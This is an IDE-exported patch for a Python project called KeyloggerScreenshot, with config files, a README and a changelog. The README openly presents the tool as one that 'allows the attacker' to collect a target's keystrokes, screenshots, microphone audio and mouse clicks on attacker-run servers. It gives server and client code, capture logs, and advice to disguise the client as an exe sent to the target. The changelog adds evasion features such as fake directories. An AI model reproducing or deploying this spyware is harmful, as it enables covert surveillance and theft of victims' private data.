@@ -1,0 +1,404 @@
+Index: .idea/inspectionProfiles/Project_Default.xml
+IDEA additional info:
+Subsystem: com.intellij.openapi.diff.impl.patch.CharsetEP
+<+>UTF-8
+===================================================================
+diff --git a/.idea/inspectionProfiles/Project_Default.xml b/.idea/inspectionProfiles/Project_Default.xml
+new file mode 100644
+--- /dev/null	(date 1670826462094)
++++ b/.idea/inspectionProfiles/Project_Default.xml	(date 1670826462094)
+@@ -0,0 +1,62 @@
++<component name="InspectionProjectProfileManager">
++  <profile version="1.0">
++    <option name="myName" value="Project Default" />
++    <inspection_tool class="NonAsciiCharacters" enabled="false" level="WARNING" enabled_by_default="false" />
++    <inspection_tool class="PyArgumentListInspection" enabled="false" level="WARNING" enabled_by_default="false" />
++    <inspection_tool class="PyGlobalUndefinedInspection" enabled="false" level="WEAK WARNING" enabled_by_default="false" />
++    <inspection_tool class="PyPep8Inspection" enabled="true" level="WEAK WARNING" enabled_by_default="true">
++      <option name="ignoredErrors">
++        <list>
++          <option value="E303" />
++          <option value="E231" />
++          <option value="E305" />
++          <option value="W292" />
++          <option value="E111" />
++          <option value="E117" />
++          <option value="E225" />
++          <option value="E262" />
++          <option value="E261" />
++          <option value="E302" />
++          <option value="E265" />
++          <option value="E722" />
++          <option value="E501" />
++          <option value="E131" />
++          <option value="E721" />
++          <option value="E701" />
++          <option value="E401" />
++        </list>
++      </option>
++    </inspection_tool>
++    <inspection_tool class="PyPep8NamingInspection" enabled="true" level="WEAK WARNING" enabled_by_default="true">
++      <option name="ignoredErrors">
++        <list>
++          <option value="N802" />
++          <option value="N803" />
++          <option value="N813" />
++        </list>
++      </option>
++    </inspection_tool>
++    <inspection_tool class="PyShadowingBuiltinsInspection" enabled="true" level="WEAK WARNING" enabled_by_default="true">
++      <option name="ignoredNames">
++        <list>
++          <option value="list" />
++          <option value="len" />
++          <option value="min" />
++        </list>
++      </option>
++    </inspection_tool>
++    <inspection_tool class="PyStatementEffectInspection" enabled="false" level="WARNING" enabled_by_default="false" />
++    <inspection_tool class="PyTypeCheckerInspection" enabled="false" level="WARNING" enabled_by_default="false" />
++    <inspection_tool class="PyUnboundLocalVariableInspection" enabled="false" level="WARNING" enabled_by_default="false" />
++    <inspection_tool class="PyUnreachableCodeInspection" enabled="false" level="WARNING" enabled_by_default="false" />
++    <inspection_tool class="PyUnresolvedReferencesInspection" enabled="false" level="WARNING" enabled_by_default="false">
++      <option name="ignoredIdentifiers">
++        <list>
++          <option value="random.randint" />
++          <option value="random.choice" />
++          <option value="int.append" />
++        </list>
++      </option>
++    </inspection_tool>
++  </profile>
++</component>
+\ No newline at end of file
+Index: .idea/vcs.xml
+IDEA additional info:
+Subsystem: com.intellij.openapi.diff.impl.patch.CharsetEP
+<+>UTF-8
+===================================================================
+diff --git a/.idea/vcs.xml b/.idea/vcs.xml
+new file mode 100644
+--- /dev/null	(date 1670826462118)
++++ b/.idea/vcs.xml	(date 1670826462118)
+@@ -0,0 +1,6 @@
++<?xml version="1.0" encoding="UTF-8"?>
++<project version="4">
++  <component name="VcsDirectoryMappings">
++    <mapping directory="$PROJECT_DIR$" vcs="Git" />
++  </component>
++</project>
+\ No newline at end of file
+Index: .idea/misc.xml
+IDEA additional info:
+Subsystem: com.intellij.openapi.diff.impl.patch.CharsetEP
+<+>UTF-8
+===================================================================
+diff --git a/.idea/misc.xml b/.idea/misc.xml
+new file mode 100644
+--- /dev/null	(date 1671567067920)
++++ b/.idea/misc.xml	(date 1671567067920)
+@@ -0,0 +1,4 @@
++<?xml version="1.0" encoding="UTF-8"?>
++<project version="4">
++  <component name="ProjectRootManager" version="2" project-jdk-name="Python 3.11 virtualenv at C:\Users\fawaz\AppData\Local\Programs\Python" project-jdk-type="Python SDK" />
++</project>
+\ No newline at end of file
+Index: .idea/modules.xml
+IDEA additional info:
+Subsystem: com.intellij.openapi.diff.impl.patch.CharsetEP
+<+>UTF-8
+===================================================================
+diff --git a/.idea/modules.xml b/.idea/modules.xml
+new file mode 100644
+--- /dev/null	(date 1670826462038)
++++ b/.idea/modules.xml	(date 1670826462038)
+@@ -0,0 +1,8 @@
++<?xml version="1.0" encoding="UTF-8"?>
++<project version="4">
++  <component name="ProjectModuleManager">
++    <modules>
++      <module fileurl="file://$PROJECT_DIR$/.idea/KeyloggerProject.iml" filepath="$PROJECT_DIR$/.idea/KeyloggerProject.iml" />
++    </modules>
++  </component>
++</project>
+\ No newline at end of file
+Index: .idea/KeyloggerProject.iml
+IDEA additional info:
+Subsystem: com.intellij.openapi.diff.impl.patch.CharsetEP
+<+>UTF-8
+===================================================================
+diff --git a/.idea/KeyloggerProject.iml b/.idea/KeyloggerProject.iml
+new file mode 100644
+--- /dev/null	(date 1671567067879)
++++ b/.idea/KeyloggerProject.iml	(date 1671567067879)
+@@ -0,0 +1,10 @@
++<?xml version="1.0" encoding="UTF-8"?>
++<module type="PYTHON_MODULE" version="4">
++  <component name="NewModuleRootManager">
++    <content url="file://$MODULE_DIR$">
++      <excludeFolder url="file://$MODULE_DIR$/venv" />
++    </content>
++    <orderEntry type="jdk" jdkName="Python 3.11 virtualenv at C:\Users\fawaz\AppData\Local\Programs\Python" jdkType="Python SDK" />
++    <orderEntry type="sourceFolder" forTests="false" />
++  </component>
++</module>
+\ No newline at end of file
+Index: requirements.txt
+IDEA additional info:
+Subsystem: com.intellij.openapi.diff.impl.patch.BaseRevisionTextPatchEP
+<+>BetterPrinting\r\npyaudio\r\npyautogui\r\nKeyloggerScreenshot
+Subsystem: com.intellij.openapi.diff.impl.patch.CharsetEP
+<+>UTF-8
+===================================================================
+diff --git a/requirements.txt b/requirements.txt
+--- a/requirements.txt	(revision a6c420a2b53f59b531028f57ea74fa068f4097c8)
++++ b/requirements.txt	(date 1671996918652)
+@@ -1,4 +1,5 @@
+ BetterPrinting
+ pyaudio
+ pyautogui
+-KeyloggerScreenshot
+\ No newline at end of file
++KeyloggerScreenshot
++pynput
+\ No newline at end of file
+Index: README.md
+IDEA additional info:
+Subsystem: com.intellij.openapi.diff.impl.patch.BaseRevisionTextPatchEP
+<+>![kali_img](https://user-images.githubusercontent.com/106278241/206914635-c9d5e505-9499-4dce-91ed-5254f495929d.png)\r\nKeyloggerScreenshot\r\n===================\r\n\r\nCreated by: Fawaz Bashiru\r\n\r\nKeyloggerScreenshot allows the attacker to get all the information the target was typing and taking screenshot of specific minutes which is being calculated in the script and all the audio of the target was speaking will be stored where your server is located. Follow the instructions to build your own server in \"KeyloggerScreenshot\"\r\n\r\ncheck out my pypi page:\r\nhttps://pypi.org/project/KeyloggerScreenshot/\r\n\r\nIf you are a Linux user then write. I would suggest to run KeyloggerScreenshot on Kali linux. To change root:\r\n\r\n`sudo -i`\r\n\r\nIn your terminal\r\n\r\nTo clone KeyloggerScreenshot simply type:\r\n\r\n`git clone https://github.com/Facileee/KeyloggerScreenshot.git`\r\n\r\nIn your terminal\r\n\r\nContinue by writing: \r\n\r\n`cd KeyloggerScreenshot`\r\n\r\nInstall all requirements:\r\n\r\n`pip install -r requirements.txt`\r\n\r\nIf there is any problem with the server than check out the other method on:\r\n\r\nhttps://pypi.org/project/KeyloggerScreenshot/\r\n\r\nHOW DOES KeyloggerScreenshot WORK?\r\n==================================\r\n\r\nWrite your IP-Address in KLS_start.py\r\n`python KLS_start.py -aip 127.0.0.1`\r\n\r\nTo create a file: \r\n`python KLS_start.py -aip 127.0.0.1 -cf`\r\n\r\nYou can also specify the filename simply write the filename after -cf\r\n`python KLS_start.py -aip 127.0.0.1 -cf test.py`\r\n\r\nTo create a server with the same ports as the target\r\n`python KLS_start.py -aip 127.0.0.1 -cf -ds`\r\n\r\nTo see all the ports:\r\n`python KLS_start.py -aip 127.0.0.1 -cf -ds -p`\r\n\r\nThe standard filename is target.py\r\n\r\nYou can also specify the seconds which is going to be run at the target\r\n\r\n`python KLS_start.py -aip 127.0.0.1 -cf test.py -s 120`\r\n\r\nThe default seconds is 60\r\n\r\nAfter running the code you can send the created filename\r\n\r\nAfter the specified seconds your directory will look like this: \r\n\r\n![img_1.png](img_1.png)\r\n\r\nOutput\r\n------\r\n```python\r\n\"\"\"\r\nCyan: ServerPhotos\r\nBlue: ServerKeylogger\r\nGreen: ServerListener\r\nWhite: Timer\r\n\r\n\r\nWaiting for connection....Waiting for connection...\r\nWaiting for connection...\r\n\r\nConnection has been established ![img_2.png](img_2.png)with the ip 127.0.0.1\r\nTime left: 02:59\r\n\r\nConnection has been established with ('127.0.0.1', 63822)\r\nTime left: 00:01Connection has been established with ('127.0.0.1', 63842)\r\n\r\nSuccessful connection for 3 minutes and 20 seconds\r\n\"Audio of target.wav\" has been saved to your directory\r\nConnection has been established with ('127.0.0.1', 63843)\r\nText of target: Hello this is a test 123. 123 Nice it works have fun  guys \r\n1 Image have been saved to your working directory\r\nWaiting for connection...\r\n\r\n\r\nConnection has been established with ('127.0.0.1', 63824)\r\n2 Images has been saved to your working directory\r\nWaiting for connection...\r\n\r\n\r\nConnection has been established with ('127.0.0.1', 63825)\r\n3 Images has been saved to your working directory\r\nWaiting for connection...\r\n\r\n\r\nConnection has been established with ('127.0.0.1', 63829)\r\n4 Images has been saved to your working directory\r\nWaiting for connection...\r\n\r\n\r\nConnection has been established with ('127.0.0.1', 63841)\r\n5 Images has been saved to your working directory\r\nWaiting for connection...\r\n\r\n\"\"\"\r\n```\r\n\r\nAdditional\r\n==========\r\n* You can send \"target.py\" as an exe file to the target with \"auto-py-to-exe\"\r\n\r\n* KeyloggerScreenshot is very easy to use.\r\n\r\n* The servers can be used on any OS. The client should be a Windows OS\r\n\r\n* DO NOT USE THIS TO ATTACK SOMEONE FOREIGN. I BUILD IT FOR EDUCATIONAL PURPOSES.\r\n
+Subsystem: com.intellij.openapi.diff.impl.patch.CharsetEP
+<+>UTF-8
+===================================================================
+diff --git a/README.md b/README.md
+--- a/README.md	(revision a6c420a2b53f59b531028f57ea74fa068f4097c8)
++++ b/README.md	(date 1671996918737)
+@@ -1,84 +1,96 @@
+ ![kali_img](https://user-images.githubusercontent.com/106278241/206914635-c9d5e505-9499-4dce-91ed-5254f495929d.png)
+ KeyloggerScreenshot
+-===================
+-
++====================
+ Created by: Fawaz Bashiru
+ 
+-KeyloggerScreenshot allows the attacker to get all the information the target was typing and taking screenshot of specific minutes which is being calculated in the script and all the audio of the target was speaking will be stored where your server is located. Follow the instructions to build your own server in "KeyloggerScreenshot"
++KeyloggerScreenshot allows the attacker to get all the information the target was typing and taking screenshot of specific minutes which is being calculated in the script and all the audio of the target was speaking will be stored where your server is located. Every mouse click will be stored in a text file. Follow the instructions to build your own server in "KeyloggerScreenshot"
+ 
+-check out my pypi page:
+-https://pypi.org/project/KeyloggerScreenshot/
++Check out my github for the more easier way: https://github.com/Facileee/KeyloggerScreenshot
+ 
+-If you are a Linux user then write. I would suggest to run KeyloggerScreenshot on Kali linux. To change root:
++To install KeyloggerScreenshot simply type:
+ 
+-`sudo -i`
++``
++pip install KeyloggerScreenshot
++``
+ 
+ In your terminal
+ 
+-To clone KeyloggerScreenshot simply type:
+-
+-`git clone https://github.com/Facileee/KeyloggerScreenshot.git`
+-
+-In your terminal
+-
+-Continue by writing: 
+-
+-`cd KeyloggerScreenshot`
+-
+-Install all requirements:
+-
+-`pip install -r requirements.txt`
+-
+-If there is any problem with the server than check out the other method on:
+-
+-https://pypi.org/project/KeyloggerScreenshot/
+-
+ HOW DOES KeyloggerScreenshot WORK?
+ ==================================
++This module can be used in Windows and Linux
++
++The servers can now be run in the same file with the module threading
++
++The port number for each server should be different
++
++The server should obviously be run before the client
++
++You can just copy the following code and insert you ip-address in the variable "ip"
+ 
+-Write your IP-Address in KLS_start.py
+-`python KLS_start.py -aip 127.0.0.1`
++You can find your ip-address in the command line by using the command "ipconfig"
+ 
+-To create a file: 
+-`python KLS_start.py -aip 127.0.0.1 -cf`
++For example:
++-----------
+ 
+-You can also specify the filename simply write the filename after -cf
+-`python KLS_start.py -aip 127.0.0.1 -cf test.py`
++Servers
++-------
+ 
+-To create a server with the same ports as the target
+-`python KLS_start.py -aip 127.0.0.1 -cf -ds`
++````python
++#EveryServer.py:
++import KeyloggerScreenshot as ks
++import threading
+ 
+-To see all the ports:
+-`python KLS_start.py -aip 127.0.0.1 -cf -ds -p`
++ip = "127.0.0.1"
+ 
+-The standard filename is target.py
++ip_photos, port_photos = ip, 1111
++server_photos = ks.ServerPhotos(ip_photos, port_photos)
+ 
+-You can also specify the seconds which is going to be run at the target
++ip_keylogger, port_keylogger = ip, 2222
++server_keylogger = ks.ServerKeylogger(ip_keylogger, port_keylogger)
+ 
+-`python KLS_start.py -aip 127.0.0.1 -cf test.py -s 120`
++ip_listener, port_listener = ip, 3333
++server_listener = ks.ServerListener(ip_listener, port_listener)
+ 
+-The default seconds is 60
++ip_time, port_time = ip, 4444
++server_time = ks.Timer(ip_time, port_time)
+ 
+-After running the code you can send the created filename
++threading_server = threading.Thread(target=server_photos.start)
++threading_server.start()
+ 
+-After the specified seconds your directory will look like this: 
++threading_server2 = threading.Thread(target=server_keylogger.start)
++threading_server2.start()
+ 
+-![img_1.png](img_1.png)
++threading_server3 = threading.Thread(target=server_listener.start)
++threading_server3.start()
+ 
++threading_server4 = threading.Thread(target=server_time.start_timer)
++threading_server4.start()
++````
++Every screenshots, photos and audio files will be saved locally where your server is located even if the connection isn't stable.
++
++Clients
++-------
++````python
++#client_target.py
++import KeyloggerScreenshot as ks
++
++ip = '127.0.0.1'
++key_client = ks.KeyloggerTarget(ip, 1111, ip, 2222, ip, 3333,ip, 4444, duration_in_seconds=60)
++key_client.start()
+ Output
+-------
+-```python
++````
+ """
++
++````
+ Cyan: ServerPhotos
+ Blue: ServerKeylogger
+ Green: ServerListener
+ White: Timer
+ 
+-
+ Waiting for connection....Waiting for connection...
+ Waiting for connection...
+ 
+-Connection has been established ![img_2.png](img_2.png)with the ip 127.0.0.1
++Connection has been established with the ip 127.0.0.1
+ Time left: 02:59
+ 
+ Connection has been established with ('127.0.0.1', 63822)
+@@ -110,16 +122,15 @@
+ Connection has been established with ('127.0.0.1', 63841)
+ 5 Images has been saved to your working directory
+ Waiting for connection...
++````
+ 
+-"""
+-```
+ 
+ Additional
+-==========
+-* You can send "target.py" as an exe file to the target with "auto-py-to-exe"
++===========
++* You can send "client_target.py" as an exe file to the target with "auto-py-to-exe"
+ 
+ * KeyloggerScreenshot is very easy to use.
+ 
+ * The servers can be used on any OS. The client should be a Windows OS
+ 
+-* DO NOT USE THIS TO ATTACK SOMEONE FOREIGN. I BUILD IT FOR EDUCATIONAL PURPOSES.
++* DO NOT USE THIS TO ATTACK SOMEONE FOREIGN. I BUILD IT FOR EDUCATIONAL PURPOSES.
+\ No newline at end of file
+Index: CHANGELOG.txt
+IDEA additional info:
+Subsystem: com.intellij.openapi.diff.impl.patch.BaseRevisionTextPatchEP
+<+>Change Log\r\n==========\r\n\r\n0.0.1 (14/10/2022)\r\n-----------------\r\n- First Release\r\n\r\n0.0.2 (15/10/2022)\r\n-----------------\r\n- Bug Fixes\r\n\r\n0.0.3 (15/10/2022)\r\n-----------------\r\n- Bug Fixes\r\n\r\n0.0.4 (17/10/2022)\r\n-----------------\r\n- New features (Audio Recorder from target, All Servers in one file)\r\n- Bug Fixes\r\n- Detailed review of the code\r\n\r\n0.0.5 (18/10/2022)\r\n-----------------\r\n- Better audio connection\r\n- Bug Fixes\r\n\r\n0.0.6 (19/10/2022)\r\n-----------------\r\n- New Timer Class\r\n- Better Output on Terminal\r\n- More efficient connection\r\n- More Ports and IP's\r\n\r\n0.0.6.1 (19/10/2022)\r\n------------------\r\n- Bug Fixes\r\n\r\n0.0.7 (24/10/2022)\r\n-----------------\r\n- Better Description\r\n\r\n0.1.0 (30/10/2022)\r\n-----------------\r\n- Bug Fixes\r\n- pyscreeze Error fixed\r\n- Keyboard Interruption (server will be destroyed after Keyboard Interruption from the user)\r\n- Keylogger data even after Keyboard Interruption\r\n- Much better Audio connection\r\n- Better Audio Files\r\n\r\n0.1.1 (30/10/2022)\r\n------------------\r\n- Image fix on website\r\n\r\n0.1.2 (7/11/2022)\r\n------------------\r\n- Bug Fixes\r\n- Big Update 12.11.2022
+Subsystem: com.intellij.openapi.diff.impl.patch.CharsetEP
+<+>UTF-8
+===================================================================
+diff --git a/CHANGELOG.txt b/CHANGELOG.txt
+--- a/CHANGELOG.txt	(revision a6c420a2b53f59b531028f57ea74fa068f4097c8)
++++ b/CHANGELOG.txt	(date 1671995678899)
+@@ -55,4 +55,34 @@
+ 0.1.2 (7/11/2022)
+ ------------------
+ - Bug Fixes
+-- Big Update 12.11.2022
+\ No newline at end of file
++- Big Update 12.11.2022
++
++0.1.3 (22/11/2022)
++------------------
++- More easier way in github
++
++0.1.4 (24/11/2022)
++------------------
++- Better looking terminal
++
++0.1.5 (04/12/2022)
++------------------
++- Github version got better
++- Faster Server
++- GUI is planned
++
++0.1.6 (11/12/2022)
++------------------
++- New function all_dir makes 100 fake directories
++- The Image will know be stored in a random directory
++- Thanks for the feedback
++- All the 100 fake directories will be deleted after the specified minutes
++
++0.2.0 (25/12/2022)
++------------------
++- Better code
++- New functions in KeyloggerTarget class
++- Mouse info is being stored
++- More photos
++- Exactly every 20 seconds
++- Better ServerKeylogger
+\ No newline at end of file
+Index: .idea/inspectionProfiles/profiles_settings.xml
+IDEA additional info:
+Subsystem: com.intellij.openapi.diff.impl.patch.CharsetEP
+<+>UTF-8
+===================================================================
+diff --git a/.idea/inspectionProfiles/profiles_settings.xml b/.idea/inspectionProfiles/profiles_settings.xml
+new file mode 100644
+--- /dev/null	(date 1670826462086)
++++ b/.idea/inspectionProfiles/profiles_settings.xml	(date 1670826462086)
+@@ -0,0 +1,6 @@
++<component name="InspectionProjectProfileManager">
++  <settings>
++    <option name="USE_PROJECT_PROFILE" value="false" />
++    <version value="1.0" />
++  </settings>
++</component>
+\ No newline at end of file
